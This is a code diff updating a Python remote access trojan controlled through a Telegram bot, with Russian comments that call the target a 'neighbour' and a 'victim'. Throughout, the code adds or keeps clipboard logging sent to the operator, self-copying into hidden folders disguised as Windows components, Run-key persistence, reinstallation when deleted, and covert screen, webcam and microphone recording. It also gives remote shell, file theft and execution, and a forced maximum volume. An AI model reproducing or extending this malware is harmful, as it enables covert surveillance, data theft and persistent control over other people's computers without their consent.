@@ -30,9 +30,22 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 import wavio
 
+# --- ИСПРАВЛЕННЫЙ ИМПОРТ MOVIEPY ДЛЯ EXE ---
+import imageio
+# Костыль для обхода ошибки "PackageNotFoundError"
+try:
+    imageio.__version__ = "2.33.0"
+except:
+    pass
+
+# Импортируем напрямую, чтобы избежать лишних проверок в moviepy.editor
+from moviepy.video.io.VideoFileClip import VideoFileClip
+from moviepy.audio.io.AudioFileClip import AudioFileClip
+import moviepy.config as cf
+
 # --- ТВОИ НАСТРОЙКИ ---
-TOKEN = 'ВАШ_ТОКЕН_ИЗ_BOTFATHER'
-MY_ID = 000000000 # ВАШ_ID_ИЗ_USERINFOBOT
+TOKEN = 'ID_БОТА_ИЗ_BOTFATHER'
+MY_ID =  # ВАШ_ID_ИЗ_USERINFOBOT
 HOME_DIR = os.getcwd()
 bot = telebot.TeleBot(TOKEN)
 
@@ -42,6 +55,8 @@ import shutil
 import winreg
 import sys
 import os
+
+user_states = {}
 
 def anti_task_manager():
     global stream_active
@@ -61,22 +76,32 @@ def anti_task_manager():
                 pass
         time.sleep(2) # Проверяем каждые 2 секунды
 
+MAIN_PATH = os.path.join(os.path.expanduser("~"), "Documents", "My Games", "TheLongDrive")
+
 def clipboard_logger():
-    # ПРИ ЗАПУСКЕ: сразу запоминаем, что уже скопировано (чтобы не слать старое)
+    # Определяем, в какой папке находится запущенный файл
+    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    
+    # Сравниваем пути (приводим к нижнему регистру для надежности)
+    if current_dir.lower() != MAIN_PATH.lower():
+        print(f"[*] Копия в '{current_dir}' работает только в режиме защиты (логгер выключен).")
+        return # Выходим из функции, чтобы не спамить
+
+    # --- Твой основной код логгера ---
     try:
         last_text = pyperclip.paste() 
     except:
         last_text = ""
         
-    print(">>> Логгер буфера запущен и игнорирует старый текст!") 
+    print(f">>> ГЛАВНЫЙ Логгер запущен в {MAIN_PATH}!") 
     
     while True:
         try:
             current_text = pyperclip.paste()
-            # Теперь бот пришлет только то, что скопировано ПОСЛЕ запуска
             if current_text != last_text and current_text.strip():
                 print(f"Обнаружен новый текст: {current_text[:30]}...") 
                 last_text = current_text
+                # Передаем в телеграм
                 bot.send_message(MY_ID, f"🔔 Буфер: {last_text}")
         except Exception as e:
             print(f"Ошибка буфера: {e}")
@@ -99,21 +124,15 @@ def autorun():
     if sys.argv[0].endswith('.py'):
         return
 
-    # 1. Список ПАПОК, где бот будет прятаться
     target_dirs = [
         os.path.join(os.environ['USERPROFILE'], 'Documents', 'My Games', 'TheLongDrive'),
-        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'), # Папка SystemHelper
-        os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')        # Папка WinUpdateManager
+        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'),
+        os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')
     ]
-
-    # 2. Список ИМЕН для самого EXE в каждой папке
     exe_names = [FAKE_NAME, "Helper.exe", "WinUpdate.exe"]
-
-    # 3. Список ИМЕН для реестра
     reg_names = ["WindowsUpdateTask", "MicrosoftHelper", "WinTempManager"]
 
-    # Путь к папке, откуда мы СЕЙЧАС запущены
-    current_exe = os.path.abspath(sys.executable)
+    current_exe = os.path.abspath(sys.argv[0]) # Берем путь самого файла
     current_folder = os.path.dirname(current_exe)
 
     try:
@@ -122,26 +141,31 @@ def autorun():
         for i in range(len(target_dirs)):
             full_exe_path = os.path.join(target_dirs[i], exe_names[i])
             
-            # Если папки еще нет — копируем ВСЁ содержимое нашей текущей папки туда
-            if not os.path.exists(target_dirs[i]):
-                # copytree копирует всю папку целиком со всеми DLL
+            # ПРОВЕРКА: Если папки или файла НЕТ
+            if not os.path.exists(full_exe_path):
+                # Если это не первый запуск (папка уже была, но пропала) — шлем алярм
+                if os.path.exists(target_dirs[i]): 
+                     bot.send_message(MY_ID, f"⚠️ **Файл удален!**\nПуть: `{full_exe_path}`\n\n✅ Восстанавливаю...")
+
                 shutil.copytree(current_folder, target_dirs[i], dirs_exist_ok=True)
                 
-                # Переименовываем главный EXE в этой папке под новое имя (Helper.exe и т.д.)
-                # Старое имя в новой папке — это то, как назывался наш файл изначально
+                # Переименовываем в нужное имя (Helper.exe и т.д.)
                 old_path_in_new_dir = os.path.join(target_dirs[i], os.path.basename(current_exe))
                 if old_path_in_new_dir != full_exe_path:
-                    os.rename(old_path_in_new_dir, full_exe_path)
+                    try: os.rename(old_path_in_new_dir, full_exe_path)
+                    except: pass
                 
-                # Прячем всю папку (атрибут 6: системный + скрытый)
                 ctypes.windll.kernel32.SetFileAttributesW(target_dirs[i], 6)
+                
+                # Если восстановили — запускаем его на всякий случай
+                os.startfile(full_exe_path)
 
-            # Прописываем в автозагрузку путь к EXE в этой папке
+            # Прописываем в реестр
             winreg.SetValueEx(key, reg_names[i], 0, winreg.REG_SZ, full_exe_path)
             
         winreg.CloseKey(key)
 
-        # ПЕРЕЕЗД: если мы запущены не из "элитных" мест — запускаем копию и выходим
+        # ПЕРЕЕЗД: Если запущены "извне" — уходим в элитные папки
         if current_folder.lower() not in [d.lower() for d in target_dirs]:
             os.startfile(os.path.join(target_dirs[0], exe_names[0]))
             os._exit(0)
@@ -150,30 +174,50 @@ def autorun():
         print(f"Ошибка миграции: {e}")
 
 # --- ИСПРАВЛЕННОЕ ПРИВЕТСТВИЕ ---
+is_online = False  # Флаг для отслеживания состояния сети
+
 def send_hello():
-    try:
-        ip = requests.get('https://api.ipify.org', timeout=5).text
-        # Добавили магическую букву 'f' перед ковычками:
-        msg = (f"🚀 **Система Remote Tool v15.0 ONLINE!**\n"
-               f"🌐 IP: `{ip}`\n"
-               f"👤 Юзер: `{os.getlogin()}`\n\n"
-               f"📁 `/cd [путь]` — сменить папку\n"
-               f"📂 `/ls` — список файлов\n"
-               f"📥 `/get [путь]` — скачать файл\n"
-               f"🚀 `/run [путь]` — запустить файл\n"
-               f"💀 `/kill [имя.exe]` — убить процесс\n"
-               f"🗑️ `/del` — [путь] — удалить файл\n"
-               f"💻 `>` — > + команды терминала\n\n"
-               f"📍 Текущая папка: `{os.getcwd()}`")
-        bot.send_message(MY_ID, msg, reply_markup=main_menu(), parse_mode='Markdown')
-    except: pass
+    global is_online
+    while True:
+        try:
+            # 1. Проверка пути (как в твоем условии)
+            current_dir = os.getcwd()
+            if current_dir.lower() != MAIN_PATH.lower():
+                return
+
+            # 2. Пробуем получить IP (проверка интернета)
+            ip = requests.get('https://ipify.org', timeout=5).text
+            
+            # 3. Если мы только что вышли в онлайн
+            if not is_online:
+                msg = (f"🚀 **Система Remote Tool v15.0 ONLINE!**\n"
+                       f"🌐 IP: `{ip}`\n"
+                       f"👤 Юзер: `{os.getlogin()}`\n\n"
+                       f"📁 `/cd [путь]` — сменить папку\n"
+                       f"📂 `/ls` — список файлов\n"
+                       f"📥 `/get [путь]` — скачать файл\n"
+                       f"🚀 `/run [путь]` — запустить файл\n"
+                       f"💀 `/kill [имя.exe]` — убить процесс\n"
+                       f"🗑️ `/del` — [путь] — удалить файл\n"
+                       f"💻 `>` — > + команды терминала\n\n"
+                       f"📍 Текущая папка: `{current_dir}`")
+                
+                bot.send_message(MY_ID, msg, reply_markup=main_menu(), parse_mode='Markdown')
+                is_online = True  # Фиксируем, что мы в сети (спама не будет)
+            
+        except Exception:
+            # Если произошла ошибка (инет пропал)
+            is_online = False # Сбрасываем флаг, чтобы при новом появлении инета бот снова отписался
+        
+        time.sleep(30)
 
 def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
     markup.add("📸 Скриншот", "📷 Вебка", "📜 Процессы")
     markup.add("🎯 Мышка-тролль", "ℹ️ Инфо", "🗣 Сказать фразу")
-    markup.add("🌐 Открыть ссылку", "🎙Подслушать", "🎥 Запись 30с")  
-    markup.add("🖼 Сменить обои", "🔴Выключение ПК", "⭕Перезагрузка ПК")
+    markup.add("🌐 Открыть ссылку", "🎬 Полная запись", "🎵 Запустить звук") 
+    markup.add("🖼 Сменить обои", "📥 Сохранить файл", "💻 Свернуть всё") 
+    markup.add("🔴Выключение ПК", "⭕Перезагрузка ПК")
     markup.add("☢️Самоуничтожение", "🔄 Перезагрузить", "🛑Стоп") 
     return markup
 
@@ -181,9 +225,21 @@ def main_menu():
 @bot.message_handler(commands=['stop'])
 def stop_cmd(message):
     if message.chat.id == MY_ID:
-        bot.send_message(message.chat.id, "👋 Система Remote Tool 15.0 уходит в оффлайн. До связи!")
-        print(">>> Бот выключен через Telegram.")
+        bot.send_message(message.chat.id, "🛑 Останавливаю ВСЕ активные копии системы... Оффлайн.")
+        print(">>> Глобальное выключение...")
+        
+        # Список имен из твоего конфига
+        exe_names = [FAKE_NAME, "Helper.exe", "WinUpdate.exe"]
+        
+        # Небольшая пауза, чтобы сообщение успело отправиться
         time.sleep(1)
+        
+        # Формируем команду для CMD, которая убьет все процессы из списка
+        # /F - принудительно, /T - включая дочерние, /IM - поиск по имени образа
+        for exe in exe_names:
+            os.system(f'taskkill /f /im "{exe}" /t > nul 2>&1')
+        
+        # На всякий случай закрываем текущий процесс, если его имени не было в списке
         os._exit(0)
 
 # --- 🕹 ОСТАЛЬНЫЕ КОМАНДЫ ---
@@ -270,7 +326,7 @@ def send_webcam_photo(message):
             cap.release() # КРИТИЧНО: освобождаем камеру для других функций
             
             with open(path, "rb") as img:
-                bot.send_photo(message.chat.id, img, caption="📸 Опа ну ты и красавчик сегодня!")
+                bot.send_photo(message.chat.id, img, caption="📸 Сосед пойман врасплох!")
             os.remove(path)
         else:
             cap.release()
@@ -278,57 +334,118 @@ def send_webcam_photo(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ Ошибка вебки: {e}")
 
-def record_video(message):
-    bot.send_message(message.chat.id, "🎬 Записываю экран + вебку (30 сек)...")
-    file_path = "record.mp4"
+def record_full(message):
+    bot.send_message(message.chat.id, "🎬 Записываю всё сразу (30 сек)...")
     
-    # Настройки: 8 кадров в секунду, размер файла 1280x720
+    video_path = "temp_video.mp4"
+    audio_path = "temp_audio.wav"
+    final_path = "full_record.mp4"
+    
+    duration = 30 
+    fps = 8.0
+    sample_rate = 44100
+
+    # 1. ЗВУК (запуск)
+    audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
+
+    # 2. ВИДЕО (экран + вебка)
     fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-    out = cv2.VideoWriter(file_path, fourcc, 8.0, (1280, 720)) 
+    out = cv2.VideoWriter(video_path, fourcc, fps, (1280, 720))
     
     with mss() as sct:
         monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
-        cap = cv2.VideoCapture(0) 
-        
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
         start_time = time.time()
-        while (time.time() - start_time) < 30:
-            loop_start = time.time() # Фиксируем время начала кадра
-            
-            # 1. Захват экрана
+        while (time.time() - start_time) < duration:
+            loop_start = time.time()
             img = np.array(sct.grab(monitor))
-            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-            
-            # 2. РЕСАЙЗ экрана под размер видео (ОБЯЗАТЕЛЬНО)
-            frame = cv2.resize(frame, (1280, 720))
-            
-            # 3. Наложение вебки
+            frame = cv2.resize(cv2.cvtColor(img, cv2.COLOR_BGRA2BGR), (1280, 720))
             success, web = cap.read()
             if success:
-                web_small = cv2.resize(web, (250, 150)) # Вебка чуть поменьше
+                web_small = cv2.resize(web, (250, 150))
                 h, w, _ = web_small.shape
-                # Клеим в правый нижний угол (координаты под 1280x720)
                 frame[720-h-20:720-20, 1280-w-20:1280-20] = web_small
-                
             out.write(frame)
-            
-            # 4. СИНХРОНИЗАЦИЯ (чтобы 30 сек видео = 30 сек жизни)
-            # Нам нужно 8 кадров в секунду (1 / 8 = 0.125 сек на кадр)
             elapsed = time.time() - loop_start
-            if elapsed < 0.125:
-                time.sleep(0.125 - elapsed)
-            
+            if elapsed < (1/fps): time.sleep((1/fps) - elapsed)
         cap.release()
         out.release()
 
-    # Отправка
+    # 3. ЗВУК (сохранение)
+    sd.wait()
+    wavio.write(audio_path, audio_data, sample_rate, sampwidth=2)
+
+    # --- ВОТ СЮДА ВСТАВЛЯЕМ MOVIEPY ---
     try:
-        with open(file_path, "rb") as video:
-            bot.send_video(message.chat.id, video, caption="✅ Видео с экрана и вебки готово!")
+        from moviepy.editor import VideoFileClip, AudioFileClip
+        
+        video_clip = VideoFileClip(video_path)
+        audio_clip = AudioFileClip(audio_path)
+        final_clip = video_clip.set_audio(audio_clip)
+        # Склеиваем в итоговый файл
+        final_clip.write_videofile(final_path, codec="libx264", audio_codec="aac", logger=None)
+        
+        # Отправляем
+        with open(final_path, "rb") as v:
+            bot.send_video(message.chat.id, v, caption="✅ Видео+Вебка+Звук готовы!")
+            
     except Exception as e:
-        bot.send_message(message.chat.id, f"❌ Ошибка отправки: {e}")
-    
-    if os.path.exists(file_path):
-        os.remove(file_path)
+        bot.send_message(message.chat.id, f"❌ Ошибка склейки: {e}")
+
+    # Чистим мусор
+    for f in [video_path, audio_path, final_path]:
+        if os.path.exists(f): os.remove(f)
+
+def set_max_volume():
+    # Нажимаем клавишу Volume Up (0xAF) 50 раз
+    for _ in range(50):
+        ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
+
+def play_audio(message):
+    try:
+        file_id = message.audio.file_id if message.audio else message.voice.file_id
+        file_info = bot.get_file(file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        path = os.path.join(HOME_DIR, "temp_music.mp3")
+        with open(path, 'wb') as f: f.write(downloaded_file)
+        
+        # 1. Выкручиваем звук на 100%
+        set_max_volume()
+        
+        # 2. Запускаем файл
+        os.startfile(path)
+        bot.send_message(message.chat.id, "🔊 Пизда лупасит! Запускаю...")
+        
+        # 3. Держим громкость (цикл на 10 секунд)
+        # Каждую секунду проверяем и подтягиваем на 100%, если жертва пытается убавить
+        for _ in range(10):
+            set_max_volume()
+            time.sleep(1)
+            
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка звука: {e}")
+
+# Функция сохранения любого файла
+def save_any_file(message):
+    try:
+        # Пытаемся вытянуть ID из любого типа сообщения
+        file_obj = message.document or message.video or message.audio or message.voice
+        file_id = file_obj.file_id
+        # Пробуем взять имя файла, если его нет — генерим по времени
+        file_name = getattr(file_obj, 'file_name', f"file_{int(time.time())}")
+        
+        file_info = bot.get_file(file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        save_path = r"C:\Downloads" # Можешь поменять путь тут
+        if not os.path.exists(save_path): os.makedirs(save_path)
+        
+        full_path = os.path.join(save_path, file_name)
+        with open(full_path, 'wb') as f: f.write(downloaded_file)
+        bot.send_message(message.chat.id, f"✅ Файл сохранен:\n`{full_path}`", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка сохранения: {e}")
 
 def set_wallpaper(message):
     try:
@@ -354,37 +471,6 @@ def set_wallpaper(message):
         
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ Ошибка при смене обоев: {e}")
-
-def record_mic(message):
-    # Внутренняя функция для потока
-    def start_recording():
-        try:
-            fs = 44100
-            duration = 30
-            # Используем os.getcwd(), чтобы файл создался там, где бот сейчас (в TheLongDrive)
-            path = "mic.wav"
-            
-            # Начинаем запись
-            # channels=1 для обычных микрофонов, 2 если стерео
-            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
-            sd.wait() # Ждем 30 секунд
-            
-            # Сохраняем в формате wav
-            wavio.write(path, recording, fs, sampwidth=2)
-            
-            # Отправляем как ГОЛОСОВОЕ сообщение (так удобнее слушать в ТГ)
-            with open(path, 'rb') as f:
-                bot.send_voice(message.chat.id, f, caption="🎙 Запись с микрофона (30 сек)") 
-            
-            # Чистим за собой
-            if os.path.exists(path):
-                os.remove(path)
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Ошибка микро: {e}")
-
-    # Запускаем запись в отдельном потоке, чтобы бот не "замерз" на 30 секунд
-    threading.Thread(target=start_recording, daemon=True).start()
-    bot.send_message(message.chat.id, "🎤 Микрофон включен на 30 секунд. Жди файл...")
 
 # --- ФУНКЦИЯ ОТКРЫТИЯ ССЫЛКИ ---
 def process_open_url(message):
@@ -437,6 +523,28 @@ def kill_cmd(message):
 
 # --- 🖱 ОБРАБОТКА КНОПОК И ТЕКСТА ---
 
+@bot.message_handler(content_types=['document', 'audio', 'video', 'voice'])
+def handle_files_by_state(message):
+    if message.chat.id != MY_ID: return
+    
+    state = user_states.get(message.chat.id)
+    
+    if state == "waiting_audio":
+        # Если нажали кнопку "Запустить звук"
+        if message.audio or message.voice or (message.document and message.document.mime_type.startswith('audio')):
+            threading.Thread(target=play_audio, args=(message,)).start()
+            user_states[message.chat.id] = None # Сбрасываем режим после запуска
+        else:
+            bot.send_message(message.chat.id, "❌ Это не похоже на звук. Пришли аудио или отмени действие.")
+
+    elif state == "waiting_file":
+        # Если нажали кнопку "Сохранить файл"
+        threading.Thread(target=save_any_file, args=(message,)).start()
+        user_states[message.chat.id] = None # Сбрасываем режим после сохранения
+    
+    else:
+        bot.send_message(message.chat.id, "⚠️ Сначала нажми кнопку (Запустить звук или Сохранить файл), чтобы я знал, что делать.")
+
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
     global stream_active  
@@ -465,19 +573,31 @@ def handle_text(message):
         msg = "📋 Программы:\n\n" + "\n".join([f"🔹 {p}" for p in procs[:40]])
         bot.send_message(message.chat.id, msg)
 
-    elif message.text == "🎥 Запись 30с":
-        # Запускаем в отдельном потоке, чтобы бот не "завис" во время записи
-        threading.Thread(target=record_video, args=(message,)).start()
+    elif message.text == "🎬 Полная запись":
+        threading.Thread(target=record_full, args=(message,)).start()
+
+    elif message.text == "💻 Свернуть всё":
+        # Имитируем нажатие Win+D
+        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0) # Win
+        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0) # D
+        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0) # D up
+        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0) # Win up
+        bot.send_message(message.chat.id, "Все окна свернуты!")
+
+    elif message.text == "🎵 Запустить звук":
+        user_states[message.chat.id] = "waiting_audio"
+        bot.send_message(message.chat.id, "🎤 Жду аудио или голосовое для запуска...")
+
+    elif message.text == "📥 Сохранить файл":
+        user_states[message.chat.id] = "waiting_file"
+        bot.send_message(message.chat.id, "📂 Жду любой файл для сохранения в C:\\Downloads...")
 
     elif message.text == "🛑Стоп":
         stop_cmd(message)
 
     elif message.text == "🖼 Сменить обои":
         msg = bot.send_message(message.chat.id, "📸 Пришли мне картинку пупсик")
-        bot.register_next_step_handler(msg, set_wallpaper)
-
-    elif message.text == "🎙Подслушать":
-        record_mic(message) 
+        bot.register_next_step_handler(msg, set_wallpaper) 
 
     elif message.text == "🌐 Открыть ссылку":
         msg = bot.send_message(message.chat.id, "🔗 Пришли ссылку:")
@@ -563,43 +683,60 @@ def handle_text(message):
 
     elif message.text == "☢️Самоуничтожение":
         if message.chat.id == MY_ID:
-            bot.send_message(message.chat.id, "💣 Запускаю ПОЛНЫЙ протокол самоуничтожения... Чищу все копии и реестр. Прощай!")
+            bot.send_message(message.chat.id, "💣 Запускаю ПОЛНЫЙ протокол самоуничтожения... Чищу все копии, папки и реестр. Прощай!")
         
-        # 1. Список всех путей и ключей из твоего autorun
-        targets = [
-            os.path.join(os.environ['USERPROFILE'], 'Documents', 'My Games', 'TheLongDrive'),
-            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'),
-            os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')
-        ]
-        reg_names = ["WindowsUpdateTask", "MicrosoftHelper", "WinTempManager"]
-        
+            target_dirs = [
+                os.path.join(os.environ['USERPROFILE'], 'Documents', 'My Games', 'TheLongDrive'),
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'),
+                os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')
+            ]
+            exe_names = ["CompPkgSrv.exe", "Helper.exe", "WinUpdate.exe"] # Убедись, что тут актуальное имя
+            reg_names = ["WindowsUpdateTask", "MicrosoftHelper", "WinTempManager"]
+            
+            try:
+                # 1. Чистим реестр
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
+                for reg_name in reg_names:
+                    try:
+                        winreg.DeleteValue(key, reg_name)
+                    except: pass 
+                winreg.CloseKey(key)
+                
+                # 2. Создаем мощный BAT-файл для зачистки
+                bat_path = os.path.join(os.environ['TEMP'], 'final_cleanup.bat')
+                with open(bat_path, "w", encoding="cp866") as f:
+                    f.write('@echo off\n')
+                    f.write('timeout /t 3 /nobreak > nul\n')
+                    
+                    # Убиваем процессы
+                    for exe in exe_names:
+                        f.write(f'taskkill /f /im "{exe}" /t > nul 2>&1\n')
+                    
+                    f.write('timeout /t 2 /nobreak > nul\n')
+                    
+                    # Удаляем папки (самое главное)
+                    for folder in target_dirs:
+                        # rd /s /q удаляет папку целиком, даже если она не пуста
+                        f.write(f'if exist "{folder}" rd /s /q "{folder}"\n')
+                    
+                    # Удаляем сам батник в конце
+                    f.write(f'del "%~f0"\n')
+                
+                # 3. Запускаем батник и мгновенно выходим
+                os.startfile(bat_path)
+                os._exit(0)
+                
+            except Exception as e:
+                bot.send_message(message.chat.id, f"❌ Критическая ошибка при зачистке: {e}")
+
+    # Теперь этот elif стоит на одном уровне с предыдущим elif
+    elif message.text.startswith('http'):
         try:
-            # 2. Чистим реестр (все три ключа)
-            import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
-            for reg_name in reg_names:
-                try:
-                    winreg.DeleteValue(key, reg_name)
-                except: pass # Если ключа уже нет, просто идем дальше
-            winreg.CloseKey(key)
-            
-            # 3. Создаем универсальный батник для сноса всех папок
-            bat_path = os.path.join(os.environ['TEMP'], 'final_cleanup.bat')
-            with open(bat_path, "w", encoding="cp866") as f: # Кодировка для кириллицы в путях
-                f.write('@echo off\n')
-                f.write('timeout /t 5 /nobreak > nul\n') # Ждем 5 сек, чтобы все процессы закрылись
-                for folder in targets:
-                    f.write(f'rd /s /q "{folder}"\n') # Удаляем каждую из 3-х папок
-                f.write(f'del "%~f0"\n') # Батник удаляет сам себя в конце
-            
-            # Запускаем батник
-            os.startfile(bat_path)
-            
-            # 4. Мгновенный выход
-            os._exit(0)
-            
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Критическая ошибка при зачистке: {e}")
+            url = message.text.strip()
+            # ... твой код скачивания ...
+            bot.send_message(message.chat.id, "✅ Скачано")
+        except:
+            bot.send_message(message.chat.id, "❌ Ошибка")
 
     # Ссылки
     elif message.text.startswith('http'):
@@ -619,7 +756,7 @@ def process_say_step(message):
         text = message.text
         
         # Если нажали кнопку вместо ввода текста — возвращаем меню
-        if text in ["📸 Скриншот", "📷 Вебка", "📜 Процессы", "ℹ️ Инфо", "🗣 Сказать фразу", "🔴Выключение ПК", "⭕Перезагрузка ПК"]:
+        if text in ["📸 Скриншот", "📷 Вебка", "📜 Процессы", "🎯 Мышка-тролль", "ℹ️ Инфо", "🗣 Сказать фразу", "🌐 Открыть ссылку", "🎬 Полная запись", "🎵 Запустить звук", "🖼 Сменить обои", "📥 Сохранить файл", "💻 Свернуть всё", "🔴Выключение ПК", "⭕Перезагрузка ПК", "☢️Самоуничтожение", "🔄 Перезагрузить", "🛑Стоп"]:
             bot.send_message(message.chat.id, "🕹 Возврат в меню", reply_markup=main_menu())
             return
 
@@ -664,6 +801,7 @@ if __name__ == '__main__':
     threading.Thread(target=anti_task_manager, daemon=True).start()
     threading.Thread(target=clipboard_logger, daemon=True).start()
     threading.Thread(target=persistence_check, daemon=True).start()
+    threading.Thread(target=send_hello, daemon=True).start()
     print(">>> Krosover Remote Tool v15.0 (Ultimate) запущен!") 
     send_hello()
     while True:
